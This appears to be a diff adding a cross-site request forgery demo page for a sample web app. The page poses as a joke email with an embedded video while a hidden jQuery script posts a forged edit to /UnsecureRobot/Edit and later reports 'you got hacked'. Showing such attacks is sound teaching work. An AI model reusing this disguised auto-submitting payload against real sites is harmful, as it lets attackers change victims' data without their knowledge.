@@ -1,0 +1,25 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+    <title>Evil!</title>
+    <script type="text/javascript" src="/Scripts/jquery-1.3.2.js"></script>
+</head>
+<body>
+<h3>FROM: loser@aol.com</h3>
+<h3>RE: ZOMG SOOO FUNI!! hahahah LOLZ.</h3>
+
+<object width="660" height="525"><param name="movie" value="http://www.youtube.com/v/s8MDNFaGfT4&hl=en&fs=1&rel=0&border=1"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed src="http://www.youtube.com/v/s8MDNFaGfT4&hl=en&fs=1&rel=0&border=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="660" height="525"></embed></object>
+
+<!-- evil! -->
+<script type="text/javascript">
+    $.post("/UnsecureRobot/Edit",
+    {
+        "robot.Id": "4",
+        "robot.Name": "HACKED",
+        "robot.IsPsychotic": "true"
+    },
+    function(data) { setTimeout(function() { alert("dude, you got hacked!"); }, 10000); }
+    );
+</script>
+</body>
+</html>
